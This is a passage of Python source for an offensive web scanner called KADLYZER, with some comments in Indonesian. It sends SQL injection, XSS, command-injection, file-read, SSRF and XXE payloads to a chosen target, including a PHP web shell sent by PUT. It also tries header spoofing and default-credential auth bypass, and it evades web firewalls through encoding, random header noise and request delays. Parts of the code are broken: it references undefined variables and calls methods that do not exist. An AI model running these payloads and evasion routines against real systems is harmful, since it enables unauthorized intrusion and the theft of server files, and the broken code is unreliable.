        cmd_patterns = {
            "unix_id": r"uid=\d+\(.*\)\s+gid=\d+\(.*\)",
            "win_dir": r"volume in drive|volume serial number|directory of",
            "ping_output": r"bytes=\d+\s+time=\d+ms",
            "whoami": r"nt authority|root:|unix:"
        }
        
        for pattern_name, pattern in cmd_patterns.items():
            if re.search(pattern, content):
                validation_results["confidence"] += 35
                validation_results["evidence"].append(f"Command output pattern found: {pattern_name}")
        
        # Test with time-based validation
        time_payload = "; ping -c 3 127.0.0.1 ;"
        start_time = time.time()
        test_response = requests.get(url + time_payload, headers=headers, timeout=15)
        execution_time = time.time() - start_time
        
        if execution_time > 3:
            validation_results["confidence"] += 30
            validation_results["evidence"].append(f"Time-based validation: {execution_time:.2f}s delay")

    elif vuln_type == "ssrf":
        # Check for internal service responses
        service_patterns = {
            "aws_metadata": r"ami-id|instance-id|security-credentials",
            "internal_service": r"(apache|nginx|iis|jetty|tomcat)",
            "cloud_metadata": r"compute.internal|metadata.google.internal|oracle.cloud.internal"
        }
        
        for pattern_name, pattern in service_patterns.items():
            if re.search(pattern, content):
                validation_results["confidence"] += 35
                validation_results["evidence"].append(f"Internal service pattern found: {pattern_name}")
        
        # Check for specific status codes and headers
        if status_code in [301, 302, 307]:
            location = headers.get('location', '')
            if any(internal in location for internal in ['localhost', '127.0.0.1', '169.254', '10.', '172.16', '192.168']):
                validation_results["confidence"] += 30
                validation_results["evidence"].append(f"Internal redirect detected: {location}")

    # Determine if vulnerability is confirmed based on confidence score
    validation_results["confirmed"] = validation_results["confidence"] >= 60
    
    return validation_results

async def vulnerability_scan(target_info, waf_bypass_headers=None):
    """Scan for vulnerabilities asynchronously"""
    logger.info(f"Starting vulnerability scan on {target_info['full_url']}")
    results = {}
    
    try:
        # Create scanner instance
        scanner = AdvancedBypassScanner(target_info)
        
        # Run all scans in parallel
        tasks = [
            scanner.perform_advanced_bypass_scan(),
            scanner.perform_recursive_crawling(),
            scanner.perform_parameter_fuzzing(),
            scanner.perform_advanced_auth_bypass(),
            scanner.perform_advanced_injection_scan(),
            scanner.perform_advanced_cors_scan(),
            scanner.perform_advanced_ssrf_scan(),
            scanner.perform_advanced_xxe_scan(),
            scanner.perform_advanced_deserialization_scan()
        ]
        
        # Wait for all tasks
        scan_results = await asyncio.gather(*tasks, return_exceptions=True)
        
        # Process results
        for result in scan_results:
            if isinstance(result, dict):
                results.update(result)
        
    except Exception as e:
        logger.error(f"Error during vulnerability scanning: {str(e)}")
    
    return results

def discover_parameters(url, headers):
    """Discover potential input parameters in URL and forms"""
    params = []
    
    try:
        # Check URL parameters
        parsed_url = urlparse(url)
        if parsed_url.query:
            params.extend(parse_qs(parsed_url.query).keys())
        
        # Check form parameters
        response = requests.get(url, headers=headers, timeout=10)
        soup = BeautifulSoup(response.text, 'html.parser')
        
        for form in soup.find_all('form'):
            for input_tag in form.find_all('input'):
                if input_tag.get('name'):
                    params.append(input_tag['name'])
                    
    except requests.RequestException as e:
        logger.warning(f"Error during parameter discovery request: {str(e)}")
    except Exception as e:
        logger.error(f"Unexpected error in parameter discovery: {str(e)}")
        
    return list(set(params))  # Return unique parameters

def detect_waf(url, headers):
    """Detect if WAF is present"""
    waf_signatures = {
        "Cloudflare": ["cf-ray", "__cfduid", "cf-cache-status"],
        "ModSecurity": ["mod_security", "NAXSI"],
        "Incapsula": ["incap_ses", "_incapsula_session"],
        "Akamai": ["akamai-", "ak_bmsc"],
        "F5 BIG-IP": ["BigIP", "F5-TrafficShield"],
        "Sucuri": ["sucuri-", "x-sucuri-"],
        "Barracuda": ["barra_counter_session"],
        "Citrix": ["ns_af=", "citrix_ns_id"],
        "Imperva": ["incap_ses_", "_incapsula_session"]
    }
    
    try:
        response = requests.head(url, headers=headers, timeout=10)
        response_headers = {k.lower(): v for k, v in response.headers.items()}
        
        detected_wafs = []
        for waf, signatures in waf_signatures.items():
            for signature in signatures:
                if any(signature.lower() in header for header in response_headers):
                    detected_wafs.append(waf)
                    break
        
        return list(set(detected_wafs))  # Return unique WAFs
        
    except Exception as e:
        logger.error(f"Error detecting WAF: {str(e)}")
        return []

class AdvancedBypassScanner:
    def __init__(self, target_info):
        self.target_info = target_info
        self.headers = self.generate_advanced_headers()
        self.payloads = self.load_advanced_payloads()
        
    def generate_advanced_headers(self):
        headers = {
            'X-Originating-IP': '127.0.0.1',
            'X-Forwarded-For': '127.0.0.1',
            'X-Remote-IP': '127.0.0.1',
            'X-Remote-Addr': '127.0.0.1',
            'X-Client-IP': '127.0.0.1',
            'X-Host': '127.0.0.1',
            'X-Custom-IP-Authorization': '127.0.0.1',
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
            'Accept': '*/*',
            'Accept-Language': 'en-US,en;q=0.9',
            'Accept-Encoding': 'gzip, deflate',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        return headers

    def load_advanced_payloads(self):
        return {
            'sqli': ["' OR '1'='1", "' UNION SELECT NULL,NULL,NULL-- -", "') OR ('1'='1"],
            'xss': ["<script>alert(1)</script>", "<img src=x onerror=alert(1)>", "javascript:alert(1)"],
            'rce': ["$(whoami)", "|| whoami", "; ping -c 1 127.0.0.1 #"],
            'lfi': ["../../../etc/passwd", "....//....//etc/passwd", "..%252f..%252f/etc/passwd"],
            'ssrf': ["http://localhost", "file:///etc/passwd", "dict://localhost:11211/"],
            'xxe': ["<?xml version='1.0'?><!DOCTYPE root [<!ENTITY test SYSTEM 'file:///etc/passwd'>]>"],
            'ssti': ["{{7*7}}", "${7*7}", "<%= 7*7 %>"],
            'nosql': ['{"$gt":""}', '{"$ne": null}', '{"$where": "1==1"}']
        }

    async def perform_scan(self):
        """Perform security scan on target"""
        logger.info(f"Starting scan on {self.target_info['full_url']}")
        results = {}
        
        try:
            # Detect WAF
            wafs = await self.detect_waf()
            if wafs:
                logger.info(f"Detected WAFs: {', '.join(wafs)}")
                results['waf_detected'] = wafs
            
            # Discover parameters
            params = await self.discover_parameters()
            if params:
                logger.info(f"Discovered parameters: {', '.join(params)}")
                results['parameters'] = params
            
            # Perform vulnerability scans
            vulns = []
            async with aiohttp.ClientSession() as session:
                for vuln_type, payloads in self.payloads.items():
                    for payload in payloads:
                        try:
                            url = f"{self.target_info['full_url']}?test={payload}"
                            async with session.get(url, headers=self.headers) as response:
                                validation = await self.validate_vulnerability(vuln_type, response, payload)
                                if validation:
                                    vulns.append({
                                        'type': vuln_type,
                                        'payload': payload,
                                        'url': url
                                    })
                        except Exception as e:
                            logger.warning(f"Error testing payload {payload}: {str(e)}")
                            continue
            
            if vulns:
                results['vulnerabilities'] = vulns
            
            return results
            
        except Exception as e:
            logger.error(f"Error during scan: {str(e)}")
            return {'error': str(e)}

    async def detect_waf(self):
        """Detect WAF presence"""
        waf_signatures = {
            "Cloudflare": ["cf-ray", "cf-cache-status"],
            "ModSecurity": ["mod_security"],
            "Incapsula": ["incap_ses"],
            "Akamai": ["akamai-", "ak_bmsc"]
        }
        
        try:
            async with aiohttp.ClientSession() as session:
                async with session.head(self.target_info['full_url'], headers=self.headers) as response:
                    headers = {k.lower(): v for k, v in response.headers.items()}
                    
                    detected = []
                    for waf, sigs in waf_signatures.items():
                        if any(sig in str(headers) for sig in sigs):
                            detected.append(waf)
                    
                    return detected
                    
        except Exception as e:
            logger.error(f"Error in WAF detection: {str(e)}")
        return None

    async def execute_waf_bypass(self):
        bypass_techniques = [
            self.null_byte_injection,
            self.double_encoding,
            self.unicode_normalization,
            self.case_switching,
            self.path_manipulation,
            self.advanced_protocol_manipulation
        ]
        
        for technique in bypass_techniques:
            try:
                await technique()
            except Exception as e:
                logger.error(f"Bypass technique failed: {str(e)}")

    async def test_advanced_payload(self, session, vuln_type, payload):
        try:
            # Implement multiple injection points
            injection_points = [
                f"{self.target_info['url']}?id={payload}",
                f"{self.target_info['url']}/{payload}",
                f"{self.target_info['url']}", # POST data injection
            ]
            
            for point in injection_points:
                async with session.get(point) as response:
                    if await self.validate_vulnerability(vuln_type, response, payload):
                        return {
                            'type': vuln_type,
                            'payload': payload,
                            'url': point,
                            'status': response.status,
                            'confidence': 'high'
                        }
            
        except Exception as e:
            logger.error(f"Error testing payload: {str(e)}")
        return None

    async def validate_vulnerability(self, vuln_type, response, payload):
        """Validate if a vulnerability is present"""
        try:
            content = await response.text()
            
            # Basic validation rules
            validation_rules = {
                'sqli': lambda: any(x in content.lower() for x in ['sql syntax', 'mysql error']),
                'xss': lambda: payload in content and not content.startswith('<!--'),
                'rce': lambda: any(x in content for x in ['root:', 'uid=']),
                'lfi': lambda: any(x in content for x in ['root:', '/etc/passwd']),
                'ssrf': lambda: response.status in [200, 301, 302],
                'xxe': lambda: 'root:' in content or '/etc/passwd' in content,
                'ssti': lambda: '49' in content,
                'nosql': lambda: response.status == 200 and len(content) > 0
            }
            
            # Check if vulnerability is present
            if vuln_type in validation_rules:
                return validation_rules[vuln_type]()
            
            return False
            
        except Exception as e:
            logger.error(f"Validation error: {str(e)}")
            return False

    async def discover_parameters(self):
        """Discover input parameters in URL and forms"""
        try:
            params = []
            
            # Get URL parameters
            parsed = urlparse(self.target_info['full_url'])
            if parsed.query:
                params.extend(parse_qs(parsed.query).keys())
            
            # Get form parameters
            async with aiohttp.ClientSession() as session:
                async with session.get(self.target_info['full_url'], headers=self.headers) as response:
                    text = await response.text()
                    soup = BeautifulSoup(text, 'html.parser')
                    
                    for form in soup.find_all('form'):
                        for input_tag in form.find_all('input'):
                            if input_tag.get('name'):
                                params.append(input_tag['name'])
            
            return list(set(params))
            
        except Exception as e:
            logger.error(f"Parameter discovery error: {str(e)}")
            return []

    async def perform_advanced_bypass_scan(self):
        """Advanced WAF bypass dengan multiple teknik"""
        bypass_results = []
        
        try:
            # Test semua kombinasi header bypass
            for headers in ADVANCED_WAF_BYPASS["headers"]:
                # Tambahkan random noise ke headers
                headers = self.add_random_noise(headers)
                
                # Encode payload dengan berbagai metode
                encoded_payloads = [
                    urllib.parse.quote(payload),
                    base64.b64encode(payload.encode()).decode(),
                    "".join(f"%{ord(c):02x}" for c in payload),
                    payload.replace(" ", "%20").replace("'", "%27").replace("\"", "%22")
                ]
                
                for encoded in encoded_payloads:
                    try:
                        # Test dengan delay untuk menghindari rate limiting
                        await asyncio.sleep(random.uniform(0.5, 1.5))
                        
                        # Kirim request dengan payload terenkripsi
                        async with aiohttp.ClientSession() as session:
                            async with session.get(
                                self.target_info['full_url'], 
                                headers=headers,
                                params={"test": encoded},
                                timeout=10
                            ) as response:
                                
                                if response.status == 200:
                                    content = await response.text()
                                    
                                    # Validasi response
                                    if self.validate_bypass_success(content, payload):
                                        bypass_results.append({
                                            "payload": encoded,
                                            "headers": headers,
                                            "status": response.status
                                        })
                                    
                    except Exception as e:
                        logger.debug(f"Bypass attempt failed: {str(e)}")
                        continue
                    
        except Exception as e:
            logger.error(f"WAF bypass error: {str(e)}")
        
        return bypass_results

    def validate_bypass_success(self, content, payload):
        """Validasi jika bypass berhasil"""
        # Check jika payload reflected di response
        if payload.lower() in content.lower():
            return True
        
        # Check untuk error messages yang menunjukkan bypass berhasil
        error_patterns = [
            "sql syntax",
            "mysql error", 
            "ora-",
            "postgresql error",
            "quoted string not properly terminated",
            "unclosed quotation mark",
            "unterminated string",
            "/etc/passwd",
            "root:x:0:0",
            "[boot loader]",
            "[operating systems]"
        ]
        
        if any(pattern in content.lower() for pattern in error_patterns):
            return True
        
        return False

    def add_random_noise(self, headers):
        """Tambahkan random noise ke headers untuk bypass WAF"""
        noise_chars = string.ascii_letters + string.digits
        
        # Add random headers
        headers.update({
            f"X-Random-{i}": "".join(random.choices(noise_chars, k=10))
            for i in range(random.randint(1,5))
        })
        
        # Modify existing headers
        for key in list(headers.keys()):
            if random.random() < 0.3:  # 30% chance to modify
                headers[key] = headers[key] + "".join(random.choices(noise_chars, k=5))
            
        return headers

async def display_scan_status(message):
    """Display simple scan status"""
    print(f"{Colors.CYAN}[*] {message}{Colors.ENDC}")

async def display_result(result):
    """Display basic scan result"""
    if not result:
        print(f"\n{Colors.GREEN}[+] No issues found{Colors.ENDC}")
        return
        
    if isinstance(result, str):
        print(f"\n{Colors.CYAN}[*] {result}{Colors.ENDC}")
        return
        
    if 'error' in result:
        print(f"\n{Colors.FAIL}[!] Error: {result['error']}{Colors.ENDC}")
        return
        
    print(f"\n{Colors.HEADER}=== Scan Results ==={Colors.ENDC}")
    
    if 'waf_detected' in result:
        print(f"\n{Colors.WARNING}[!] WAF Detected:{Colors.ENDC}")
        for waf in result['waf_detected']:
            print(f"  - {waf}")
    
    if 'parameters' in result:
        print(f"\n{Colors.BLUE}[+] Parameters Found:{Colors.ENDC}")
        for param in result['parameters']:
            print(f"  - {param}")
    
    if 'vulnerabilities' in result:
        print(f"\n{Colors.FAIL}[!] Vulnerabilities Found:{Colors.ENDC}")
        for vuln in result['vulnerabilities']:
            print(f"\n  Type: {vuln['type']}")
            print(f"  Payload: {vuln['payload']}")
            if 'url' in vuln:
                print(f"  URL: {vuln['url']}")

async def main():
    """Main entry point of the program"""
    args = None
    target_info = None
    
    try:
        # Parse command line arguments
        parser = argparse.ArgumentParser(description="KADLYZER v8.0 - Enhanced Security Testing Tool")
        parser.add_argument("--target", "-t", help="Target domain or URL", type=str)
        parser.add_argument("--output", "-o", help="Output directory for reports", type=str, default="reports")
        parser.add_argument("--full", "-f", help="Perform full scan (slower but more thorough)", action="store_true")
        parser.add_argument("--threads", help="Number of threads for concurrent operations", type=int, default=20)
        parser.add_argument("--timeout", help="Connection timeout in seconds", type=float, default=5.0)
        parser.add_argument("--quiet", "-q", help="Quiet mode, only output to log file", action="store_true")
        
        args = parser.parse_args()
        
        # Display banner
        banner()
        
        # Get target input if not provided as argument
        target = args.target
        if not target:
            await AnimatedColors.print_animated("Enter target domain or URL: ", delay=0.05)
            target = input().strip()
        
        if not target:
            print(f"{Colors.FAIL}[!] No target specified. Exiting.{Colors.ENDC}")
            return
        
        # Validate and normalize target
        target_info = validate_target(target)
        await AnimatedColors.print_animated(f"Starting scan on {target_info['full_url']}...", delay=0.03)
        
        # Display disclaimer
        print(f"\n{Colors.WARNING}{'='*70}{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] DISCLAIMER: This tool is for authorized security testing only.{Colors.ENDC}")
        print(f"{Colors.WARNING}[!] Ensure you have permission to scan the target.{Colors.ENDC}")
        print(f"{Colors.WARNING}{'='*70}{Colors.ENDC}\n")
        
        # Run the scan
        results = await run_kadlyzer(target_info)
        
        if not results:
            print(f"{Colors.FAIL}[!] No results generated. Exiting.{Colors.ENDC}")
            return
        
        # Generate and save report
        await display_scan_status("Generating final report...")
        report_data = generate_report(target_info, results)
        
        # Save HTML report
        html_report = generate_html_report(report_data)
        os.makedirs(args.output, exist_ok=True)
        report_file = os.path.join(args.output, f"kadlyzer_report_{datetime.now().strftime('%Y%m%d_%H%M%S')}.html")
        
        with open(report_file, 'w', encoding='utf-8') as f:
            f.write(html_report)
        
        print(f"\n{Colors.GREEN}[+] Scan completed! Report saved to: {report_file}{Colors.ENDC}")
        
    except KeyboardInterrupt:
        print(f"\n{Colors.WARNING}[!] Scan interrupted by user{Colors.ENDC}")
        if target_info:
            logger.warning(f"Scan interrupted for target: {target_info['full_url']}")
        sys.exit(1)
        
    except ValueError as e:
        print(f"\n{Colors.FAIL}[!] Validation error: {str(e)}{Colors.ENDC}")
        logger.error(f"Validation error: {str(e)}")
        sys.exit(2)
        
    except Exception as e:
        print(f"\n{Colors.FAIL}[!] Fatal error: {str(e)}{Colors.ENDC}")
        if target_info:
            logger.error(f"Fatal error scanning {target_info['full_url']}: {str(e)}")
        else:
            logger.error(f"Fatal error: {str(e)}")
        sys.exit(3)

class ScanError(Exception):
    """Custom exception for scan errors"""
    pass

class ValidationError(Exception):
    """Custom exception for validation errors"""
    pass

async def safe_request(session, method, url, **kwargs):
    """Make safe HTTP request with retry and proper error handling"""
    retries = 3
    backoff = 1  # seconds
    
    for attempt in range(retries):
        try:
            timeout = aiohttp.ClientTimeout(total=30)
            async with session.request(method, url, timeout=timeout, **kwargs) as response:
                return response
                
        except aiohttp.ClientError as e:
            logger.warning(f"Request failed (attempt {attempt + 1}/{retries}): {str(e)}")
            if attempt == retries - 1:
                logger.error(f"Max retries reached for {url}")
                raise ScanError(f"Failed to connect to {url}: {str(e)}")
            
            await asyncio.sleep(backoff * (attempt + 1))
            
        except asyncio.TimeoutError:
            logger.warning(f"Request timeout (attempt {attempt + 1}/{retries})")
            if attempt == retries - 1:
                logger.error(f"Max retries reached for {url}")
                raise ScanError(f"Timeout connecting to {url}")
            
            await asyncio.sleep(backoff * (attempt + 1))
            
        except Exception as e:
            logger.error(f"Unexpected error during request: {str(e)}")
            raise ScanError(f"Unexpected error: {str(e)}")
    
    return None  # Should never reach here

async def cleanup_resources():
    """Clean up any remaining resources"""
    try:
        # Cancel all running tasks
        tasks = [t for t in asyncio.all_tasks() if t is not asyncio.current_task()]
        for task in tasks:
            task.cancel()
            try:
                await task
            except asyncio.CancelledError:
                pass
            except Exception as e:
                logger.error(f"Error cancelling task: {str(e)}")
            
        # Close any remaining connections
        for task in tasks:
            if hasattr(task, 'close'):
                try:
                    await task.close()
                except Exception as e:
                    logger.error(f"Error closing task: {str(e)}")
                
    except Exception as e:
        logger.error(f"Error during cleanup: {str(e)}")
        raise

def generate_report(target_info, results):
    """Generate report data structure"""
    return {
        'target': target_info,
        'timestamp': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
        'results': results
    }

def generate_html_report(report_data):
    """Generate HTML report with modern styling"""
    css_style = """
        body { font-family: Arial, sans-serif; line-height: 1.6; margin: 0; padding: 20px; background: #f5f5f5; }
        .container { max-width: 1200px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1); }
        h1, h2 { color: #333; border-bottom: 2px solid #eee; padding-bottom: 10px; }
        .section { margin: 20px 0; padding: 15px; background: #f9f9f9; border-radius: 4px; }
        .vulnerability { margin: 10px 0; padding: 10px; border-left: 4px solid #ff4444; background: #fff; }
        .info { color: #666; font-size: 0.9em; }
        .timestamp { color: #888; font-style: italic; }
        pre { background: #f4f4f4; padding: 10px; border-radius: 4px; overflow-x: auto; }
    """

    html_template = f"""
    <!DOCTYPE html>
    <html>
    <head>
        <title>KADLYZER Scan Report</title>
        <style>{css_style}</style>
    </head>
    <body>
        <div class="container">
            <h1>KADLYZER Scan Report</h1>
            <div class="timestamp">Generated on: {report_data['timestamp']}</div>
            
            <div class="section">
                <h2>Target Information</h2>
                <pre>{str(report_data['target'])}</pre>
            </div>
            
            <div class="section">
                <h2>Scan Results</h2>
                <div class="results">
    """

    # Format results into HTML
    if isinstance(report_data['results'], dict):
        for key, value in report_data['results'].items():
            if key == 'vulnerabilities':
                html_template += f"<h3>Vulnerabilities Found</h3>"
                for vuln in value:
                    html_template += f"""
                    <div class="vulnerability">
                        <p><strong>Type:</strong> {vuln['type']}</p>
                        <p><strong>Payload:</strong> {vuln['payload']}</p>
                        <p><strong>URL:</strong> {vuln['url']}</p>
                    </div>
                    """
            elif key == 'parameters':
                html_template += f"<h3>Parameters Found</h3><ul>"
                for param in value:
                    html_template += f"<li>{param}</li>"
                html_template += "</ul>"
            elif key == 'waf_detected':
                html_template += f"<h3>WAF Detection</h3><ul>"
                for waf in value:
                    html_template += f"<li>{waf}</li>"
                html_template += "</ul>"
            else:
                html_template += f"<h3>{key}</h3><pre>{str(value)}</pre>"
    else:
        html_template += f"<pre>{str(report_data['results'])}</pre>"

    html_template += """
                </div>
            </div>
        </div>
    </body>
    </html>
    """
    
    return html_template

async def run_kadlyzer(target_info):
    """Run the main scanning process"""
    try:
        await display_scan_status("Starting scan...")
        scanner = AdvancedBypassScanner(target_info)
        result = await scanner.perform_scan()
        await display_result(result)
        return result
    except Exception as e:
        error_msg = f"Error running scan: {str(e)}"
        logger.error(error_msg)
        await display_result({'error': error_msg})
        return {'error': error_msg}

# Tambahkan teknik advanced scanning yang lebih akurat
class AdvancedScanner(AdvancedBypassScanner):
    def __init__(self, target_info):
        super().__init__(target_info)
        self.advanced_techniques = {
            "parameter_pollution": [
                "id=1&id=2&id=1'",
                "param=1;param=2;param=1'",
                "test=1/**/AND/**/1=1",
                "p=1%0Aid=1'%0Atest=1"
            ],
            "http_method_tampering": [
                ("POST", {"id": "1' OR '1'='1"}),
                ("PUT", {"data": "<?php system($_GET['cmd']); ?>"}),
                ("PATCH", {"user": "admin'--"}),
                ("OPTIONS", {"debug": "true"})
            ],
            "protocol_manipulation": [
                "gopher://localhost:3306/_",
                "file:///proc/self/environ",
                "dict://localhost:11211/",
                "ldap://localhost:389/dc=*"
            ],
            "advanced_headers": {
                "X-Original-URL": "/admin/index.php",
                "X-Rewrite-URL": "/config.php",
                "X-Custom-IP-Authorization": "127.0.0.1",
                "X-Forwarded-Scheme": "https",
                "X-HTTP-Method-Override": "PUT",
                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                "X-Forwarded-Proto": "https"
            }
        }
        
    async def perform_advanced_scan(self):
        """Melakukan scanning dengan teknik yang lebih advanced"""
        results = {}
        
        try:
            # 1. Parameter Discovery dengan Fuzzing
            params = await self.fuzz_parameters()
            if params:
                results['discovered_params'] = params
            
            # 2. Test HTTP Method Tampering
            method_vulns = await self.test_http_methods()
            if method_vulns:
                results['http_method_vulns'] = method_vulns
            
            # 3. Advanced Protocol Testing
            protocol_vulns = await self.test_protocols()
            if protocol_vulns:
                results['protocol_vulns'] = protocol_vulns
            
            # 4. Advanced Header Manipulation
            header_vulns = await self.test_headers()
            if header_vulns:
                results['header_vulns'] = header_vulns
            
            # 5. Advanced Authentication Bypass
            auth_bypass = await self.test_auth_bypass()
            if auth_bypass:
                results['auth_bypass'] = auth_bypass
            
            # 6. Advanced Race Condition Testing
            race_condition = await self.test_race_conditions()
            if race_condition:
                results['race_condition'] = race_condition
                
            return results
            
        except Exception as e:
            logger.error(f"Advanced scan error: {str(e)}")
            return {'error': str(e)}

    async def fuzz_parameters(self):
        """Fuzzing parameter untuk menemukan injection points"""
        discovered = []
        fuzz_patterns = [
            "id=1'", 
            "page=1;ls",
            "file=/etc/passwd",
            "debug=true",
            "test=<script>alert(1)</script>",
            "param=../../etc/passwd",
            "search=1 UNION SELECT 1,2,3--",
            "callback=alert(1);//"
        ]
        
        async with aiohttp.ClientSession() as session:
            for pattern in fuzz_patterns:
                try:
                    url = f"{self.target_info['full_url']}?{pattern}"
                    async with session.get(url, headers=self.headers) as response:
                        if response.status != 404:
                            content = await response.text()
                            if self.validate_fuzz_response(content, pattern):
                                discovered.append({
                                    'pattern': pattern,
                                    'status': response.status,
                                    'content_length': len(content)
                                })
                except Exception as e:
                    logger.debug(f"Fuzz error: {str(e)}")
                    
        return discovered

    async def test_http_methods(self):
        """Test berbagai HTTP methods untuk vulnerabilities"""
        vulns = []
        test_data = {
            "id": "1' OR '1'='1",
            "file": "../../../etc/passwd",
            "debug": "true",
            "cmd": "cat /etc/passwd"
        }
        
        async with aiohttp.ClientSession() as session:
            for method, data in self.advanced_techniques['http_method_tampering']:
                try:
                    async with session.request(
                        method, 
                        self.target_info['full_url'],
                        data=data,
                        headers=self.headers
                    ) as response:
                        if response.status != 405:  # Method not allowed
                            content = await response.text()
                            if self.validate_method_response(content, method, data):
                                vulns.append({
                                    'method': method,
                                    'data': data,
                                    'status': response.status
                                })
                except Exception as e:
                    logger.debug(f"HTTP method test error: {str(e)}")
                    
        return vulns

    async def test_protocols(self):
        """Test protocol-based attacks"""
        vulns = []
        
        async with aiohttp.ClientSession() as session:
            for protocol in self.advanced_techniques['protocol_manipulation']:
                try:
                    headers = self.headers.copy()
                    headers['Referer'] = protocol
                    
                    async with session.get(
                        self.target_info['full_url'],
                        headers=headers,
                        allow_redirects=True
                    ) as response:
                        content = await response.text()
                        if self.validate_protocol_response(content, protocol):
                            vulns.append({
                                'protocol': protocol,
                                'status': response.status,
                                'response_length': len(content)
                            })
                except Exception as e:
                    logger.debug(f"Protocol test error: {str(e)}")
                    
        return vulns

    async def test_auth_bypass(self):
        """Test advanced authentication bypass techniques"""
        bypass_attempts = [
            {"Authorization": "Basic YWRtaW46YWRtaW4="},  # admin:admin
            {"Cookie": "session=1234567890"},
            {"X-Original-URL": "/admin"},
            {"X-Rewrite-URL": "/admin"},
            {"X-Custom-IP-Authorization": "127.0.0.1"},
            {"X-Forwarded-For": "127.0.0.1"}
        ]
        
        results = []
        async with aiohttp.ClientSession() as session:
            for headers in bypass_attempts:
                try:
                    merged_headers = {**self.headers, **headers}
                    async with session.get(
                        f"{self.target_info['full_url']}/admin",
                        headers=merged_headers
                    ) as response:
                        if response.status == 200:
                            content = await response.text()
                            if "login" not in content.lower():
                                results.append({
                                    'headers': headers,
                                    'status': response.status,
                                    'length': len(content)
                                })
                except Exception as e:
                    logger.debug(f"Auth bypass error: {str(e)}")
                    
        return results

    async def test_race_conditions(self):
        """Test for race condition vulnerabilities"""
        results = []
        test_endpoints = [
            "/create_account",
            "/transfer",
            "/upload",
            "/process"
        ]
        
        async with aiohttp.ClientSession() as session:
            for endpoint in test_endpoints:
                tasks = []
                for _ in range(10):  # Send 10 simultaneous requests
                    task = asyncio.create_task(
                        session.post(
                            f"{self.target_info['full_url']}{endpoint}",
                            headers=self.headers,
                            data={"test": "data"}
                        )
                    )
                    tasks.append(task)
                
                try:
                    responses = await asyncio.gather(*tasks)
                    status_codes = [r.status for r in responses]
                    
                    if len(set(status_codes)) > 1:  # Different responses indicate potential race condition
                        results.append({
                            'endpoint': endpoint,
                            'status_codes': status_codes
                        })
                except Exception as e:
                    logger.debug(f"Race condition test error: {str(e)}")
                    
        return results

    def validate_fuzz_response(self, content, pattern):
        """Validasi response dari parameter fuzzing"""
        # Check for SQL injection
        if "'" in pattern and any(err in content.lower() for err in [
            'sql syntax',
            'mysql error',
            'ora-',
            'postgresql error'
        ]):
            return True
            
        # Check for XSS
        if "<script>" in pattern and pattern.lower() in content.lower():
            return True
            
        # Check for LFI
        if "/etc/passwd" in pattern and "root:" in content:
            return True
            
        return False

    def validate_method_response(self, content, method, data):
        """Validasi response dari HTTP method testing"""
        if method in ['PUT', 'POST', 'PATCH']:
            if data.get('cmd') and any(cmd in content.lower() for cmd in [
                'uid=',
                'root:',
                '/bin/bash'
            ]):
                return True
                
        if method == 'OPTIONS' and 'allow:' in content.lower():
            return True
            
        return False

    def validate_protocol_response(self, content, protocol):
        """Validasi response dari protocol testing"""
        if protocol.startswith('file:') and 'root:' in content:
            return True
            
        if protocol.startswith('gopher:') and any(db in content.lower() for db in [
            'mysql',
            'postgresql',
            'mongodb'
        ]):
            return True
            
        if protocol.startswith('dict:') and 'server' in content.lower():
            return True
            
        return False

if __name__ == "__main__":
    try:
        asyncio.run(main())
    except Exception as e:
        print(f"\n{Colors.FAIL}[!] Critical error: {str(e)}{Colors.ENDC}")
        logger.critical(f"Critical error:\n{traceback.format_exc()}")
        sys.exit(5)